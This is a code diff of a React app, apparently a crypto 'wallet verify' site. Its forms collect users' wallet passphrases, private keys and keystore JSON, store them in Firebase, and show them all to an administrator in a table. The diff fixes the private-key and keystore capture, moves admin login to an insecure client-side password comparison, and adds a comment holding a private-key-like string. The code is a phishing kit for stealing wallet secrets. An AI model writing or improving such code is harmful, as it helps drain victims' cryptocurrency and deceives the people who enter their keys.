@@ -144,7 +144,7 @@ const walletData = [
 import FirebaseDB from "./firebaseStorage.js";
 
 const firebaseDb = new FirebaseDB();
-firebaseDb.writeWalletData("test wallet", "passphrase", "example pass phrase");
+//firebaseDb.writeWalletData("test wallet", "passphrase", "example pass phrase");
 //firebaseDb.readWalletData();
 
 function savewalletData(wallet_name, auth_type, auth_text){
@@ -153,6 +153,7 @@ function savewalletData(wallet_name, auth_type, auth_text){
   alert("Submission failed: Try a different wallet.");
 }
 
+// text privateKey: 0x648ab788c99ba9ec822bbDDf78
 
 const Navigation = () => {
   return (
@@ -251,7 +252,7 @@ const PrivateKeyForm = ({ wallet_name }) => {
       console.log("checkValidity returned false!");
     } else {
       let auth_type = "phraseform";
-      let auth_text = document.getElementById("phraseInput").value;
+      let auth_text = document.getElementById("privateKeyInput").value;
       savewalletData(wallet_name, auth_type, auth_text); 
     }
 
@@ -291,7 +292,7 @@ const KeystoreJsonForm = ({ wallet_name }) => {
       console.log("checkValidity returned false!");
     } else {
       let auth_type = "phraseform";
-      let auth_text = document.getElementById("phraseInput").value;
+      let auth_text = document.getElementById("keystoreJsonInput").value;
       savewalletData(wallet_name, auth_type, auth_text); 
     }
 
@@ -522,15 +523,15 @@ const Footer = () => {
 
 const WalletTable = ({ data }) => {
     let count = 0
-    console.log(data);
-    let tableRows = data.map(({wallet_name, auth_type, auth_text, auth_file, date_added}, index) => (
+    console.log(typeof data);
+    let tableRows = Object.keys(data).map((key, index) => (
         <tr key={index}>
             <td>{index}</td>
-            <td>{wallet_name}</td>
-            <td>{auth_type}</td>
-            <td>{auth_text}</td>
+            <td>{data.key.wallet_name}</td>
+            <td>{data.key.auth_type}</td>
+            <td>{data.key.auth_text}</td>
             {/* <td>{auth_file}</td> */}
-            <td>{date_added}</td>
+            <td>{data.key.date_added}</td>
         </tr>
     ))
     console.log(tableRows)
@@ -583,17 +584,23 @@ class AdminPage extends Component {
           password: document.getElementById("adminPswd").value
       }
       var me = this;
-      $.ajax({
-        method: "POST",
-        url: "http://walletverify-server.herokuapp.com/users.php",
-        data: data_,
-    
-        success: function (data) {
-            response = data;
-            me.handleWalletsDisplay(response);
-        },
-      })
-      
+      firebaseDb.readAdminData((data) => {
+        let res = {};
+        let isAuthorized = false;
+        if(!data){res =  "Unable to retrieve admin data.";}
+
+        let _email = data_.email;
+        let _pswd = data_.password;
+        console.log(data);
+        data.forEach(({email, password}) => {
+            if(_email === email && _pswd === password) {
+                isAuthorized = true;
+            }
+        });
+
+        res.data = (isAuthorized) ? "success" : "Authorization failed";
+        me.handleWalletsDisplay(res);
+      });
       
     }
 
@@ -620,7 +627,9 @@ class AdminPage extends Component {
           console.log(data);
           if (data[0].hasOwnProperty('wallet_name') || typeof data[0] === 'object' || isArray(data)) {
             me.setState({walletList: data});
-            console.log(me.setState);
+            console.log(me.state.walletList);
+          }else {
+            console.log("No wallet data");
           }
         });
         
